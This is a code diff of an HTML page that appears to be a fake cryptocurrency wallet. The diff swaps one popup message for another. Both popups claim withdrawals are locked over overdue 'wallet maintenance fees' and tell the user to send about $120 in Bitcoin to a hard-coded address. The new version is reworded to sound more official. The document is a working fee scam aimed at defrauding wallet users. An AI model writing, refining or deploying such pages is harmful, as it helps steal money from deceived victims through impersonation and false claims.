@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en">
  <head>
   <meta charset="utf-8"/>
@@ -193,31 +192,11 @@
     fetchBTCPrice();
     setInterval(fetchBTCPrice, 30000); // refresh every 30s
 
-<script>
-  function showPaymentPopup() {
-    const message = `
-🚫 Withdrawals Locked 🚫
-
-Your wallet currently has **outstanding dues** that must be paid to enable withdrawals.
-
-💰 Outstanding Balance: $120.00 USD equivalent in BTC  
-📅 Billing Cycle: Annual (January 1 – December 31)  
-✅ Status: Payment Overdue
-
-🔓 To unlock your wallet, please send the due amount to the following BTC address:
-
-➤ Bitcoin Address:  
-bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8
-
-📌 Once payment is confirmed, withdrawals will be re-enabled.
-
-Need BTC?  
-Visit: https://www.coinbase.com/
-
-⚠️ Note: Partial payments will not unlock your wallet.
-    `;
-    alert(message);
-  }
-</script>
-</body>
+    function showPaymentPopup() {
+      alert(
+        "Error:Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals. The annual wallet maintenance fee of $59.99 USD has been unpaid for the past two years. To regain access to withdrawals, please remit the total amount due, which is $119.98 USD (representing two years of unpaid fees), to the following Bitcoin address: bc1qnkw0damggha5xp98mh9ra63rtf4kxqp5l52qs8. Upon receipt of payment, your withdrawal access will be promptly reinstated. We appreciate your cooperation in resolving this matter. Please contact support if you have any questions or require further assistance. \n\nNeed BTC? Visit: changelly.com/buy/btc/"
+      );
+    }
+  </script>
+ </body>
 </html>
